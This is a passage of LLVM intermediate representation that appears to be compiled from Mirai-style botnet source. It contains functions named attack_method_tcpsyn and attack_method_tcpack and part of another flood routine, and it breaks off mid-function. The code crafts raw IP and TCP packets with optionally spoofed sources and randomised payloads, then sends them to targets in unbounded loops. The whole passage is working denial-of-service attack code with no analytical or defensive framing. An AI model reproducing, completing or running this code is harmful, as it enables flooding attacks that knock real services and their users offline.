  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #10
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #11
  %56 = call i32 @htonl(i32 %55) #11
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = icmp eq i8 %16, 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.160 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.160 to i64
  %64 = getelementptr inbounds i8*, i8** %8, i64 %63
  %65 = load i8*, i8** %64, align 8
  br i1 %62, label %67, label %66

; <label>:66:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %65, i32 %.mask)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %66
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %65, i64 %34, i32 16384) #10
  %71 = add nsw i32 %.160, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %190, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  %..v = select i1 %69, i16 80, i16 2128
  %. = or i16 %68, %..v
  br label %87

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #10
  br label %190

.preheader.loopexit:                              ; preds = %106
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i32 %39, -1
  %73 = and i32 %11, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %17, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %19, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = icmp eq i32 %21, 65535
  %80 = icmp eq i32 %22, 65535
  %81 = icmp eq i8 %37, 0
  %82 = sext i32 %35 to i64
  %83 = add nsw i64 %82, 20
  %84 = trunc i64 %83 to i16
  %85 = trunc i64 %83 to i32
  %86 = add nsw i64 %82, 40
  br label %.loopexit

; <label>:87:                                     ; preds = %.lr.ph129, %106
  %88 = phi i32 [ 0, %.lr.ph129 ], [ %126, %106 ]
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  store i8* %89, i8** %91, align 8
  %92 = getelementptr inbounds i8, i8* %89, i64 20
  %93 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %94 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %94, align 1
  %95 = call zeroext i16 @htons(i16 zeroext %49) #11
  %96 = getelementptr inbounds i8, i8* %89, i64 2
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %12) #11
  %99 = getelementptr inbounds i8, i8* %89, i64 4
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 4
  %101 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %101, align 4
  br i1 %50, label %106, label %102

; <label>:102:                                    ; preds = %87
  %103 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %104 = getelementptr inbounds i8, i8* %89, i64 6
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %87, %102
  %107 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %107, align 1
  %108 = getelementptr inbounds i8, i8* %89, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 %39, i32* %109, align 4
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %111 = load i32, i32* %110, align 4
  %112 = getelementptr inbounds i8, i8* %89, i64 16
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = call zeroext i16 @htons(i16 zeroext %18) #11
  %115 = bitcast i8* %92 to i16*
  store i16 %114, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext %20) #11
  %117 = getelementptr inbounds i8, i8* %89, i64 22
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %51) #11
  %120 = zext i16 %119 to i32
  %121 = getelementptr inbounds i8, i8* %89, i64 24
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = getelementptr inbounds i8, i8* %89, i64 32
  %124 = bitcast i8* %123 to i16*
  store i16 %., i16* %124, align 4
  call void @rand_str(i8* nonnull %93, i32 %35)
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %5, align 4
  %127 = icmp slt i32 %126, %46
  br i1 %127, label %87, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %169
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %169
  %storemerge121128 = phi i32 [ %188, %169 ], [ 0, %.lr.ph.preheader ]
  %128 = sext i32 %storemerge121128 to i64
  %129 = getelementptr inbounds i8*, i8** %8, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %130, i64 20
  %133 = getelementptr inbounds i8, i8* %130, i64 40
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %130, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %72, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %130, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %74, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %130, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %76, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %132 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %78, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %130, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %79, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %130, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %80, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %130, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %81, label %169, label %168

; <label>:168:                                    ; preds = %167
  call void @rand_str(i8* %133, i32 %35)
  %.pre = load i32, i32* %5, align 4
  br label %169

; <label>:169:                                    ; preds = %167, %168
  %170 = phi i32 [ %storemerge121128, %167 ], [ %.pre, %168 ]
  %171 = getelementptr inbounds i8, i8* %130, i64 10
  %172 = bitcast i8* %171 to i16*
  store i16 0, i16* %172, align 2
  %173 = bitcast i8* %130 to i16*
  %174 = call zeroext i16 @checksum_generic(i16* %173, i32 20)
  store i16 %174, i16* %172, align 2
  %175 = getelementptr inbounds i8, i8* %130, i64 36
